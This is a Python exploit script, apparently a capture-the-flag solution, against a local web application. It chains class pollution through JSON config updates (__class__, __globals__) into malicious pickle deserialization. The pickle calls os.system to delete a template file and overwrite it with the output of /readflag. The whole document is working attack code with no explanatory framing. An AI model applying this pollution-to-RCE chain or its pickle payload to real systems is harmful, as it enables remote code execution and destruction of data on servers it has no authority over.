import requests
import pickle
from struct import pack

URL = "http://localhost:8080/"

s = requests.session()
user = {"username": "foo", "password": "bar"}
r = s.post(URL + "register", data=user)
r = s.post(URL + "login", data=user)

r = s.post(
    URL + "api/config",
    json={"__class__": {"_merge_info": {"__kwdefaults__": {"depth": -9999}}}},
)
print(r.text)

cmd = "rm templates/login.html && /readflag > templates/login.html"

pkl = (
    pickle.GLOBAL
    + b"os\nsystem\n"
    + pickle.MARK
    + pickle.STRING
    + f"'{cmd}'\n".encode()
    + pickle.TUPLE
    + pickle.REDUCE
)

r = s.post(
    URL + "api/config",
    json={
        "__class__": {
            "__init__": {
                "__globals__": {
                    "generate_password_hash": {
                        "__globals__": {
                            "os": {
                                "sys": {
                                    "modules": {
                                        "shelve": {"DEFAULT_PROTOCOL": 1},
                                        "_compat_pickle": {
                                            "REVERSE_IMPORT_MAPPING": {
                                                "user": "user\nConfig\n" + pkl.decode()
                                            }
                                        },
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    },
)
print(r.text)

r = s.get(URL + "api/user")
r = requests.get(URL + "login")
print(r.text)